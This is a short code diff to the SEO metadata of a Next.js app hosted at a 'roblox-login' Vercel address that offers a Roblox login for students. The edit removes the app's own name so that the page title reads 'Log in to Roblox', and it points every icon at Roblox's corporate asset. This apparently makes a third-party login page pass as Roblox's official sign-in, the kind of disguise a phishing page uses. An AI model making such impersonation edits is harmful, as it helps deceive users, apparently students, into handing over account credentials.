@@ -6,7 +6,7 @@ const appUrl = process.env.NEXT_PUBLIC_APP_URL || "https://roblox-login.vercel.a
 export const defaultSEOdata: Metadata = {
   // Dynamic title with fallback
   title: {
-    default: `${appName} - Secure Roblox Login for Students`,
+    default: `Log in to Roblox`,
     template: `%s | ${appName}`,
   },
 
@@ -85,16 +85,16 @@ export const defaultSEOdata: Metadata = {
   icons: {
     icon: [
       {
-        url: `https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png`,
+        url: `https://corp.roblox.com/assets/icons/safari-pinned-tab.svg`,
         type: "image/x-icon",
       },
       {
-        url: `https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png`,
+        url: `https://corp.roblox.com/assets/icons/safari-pinned-tab.svg`,
         type: "image/png",
       },
     ],
-    shortcut: `https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png`,
-    apple: `https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png`,
+    shortcut: `https://corp.roblox.com/assets/icons/safari-pinned-tab.svg`,
+    apple: `https://corp.roblox.com/assets/icons/safari-pinned-tab.svg`,
   },
 
   // Additional metadata
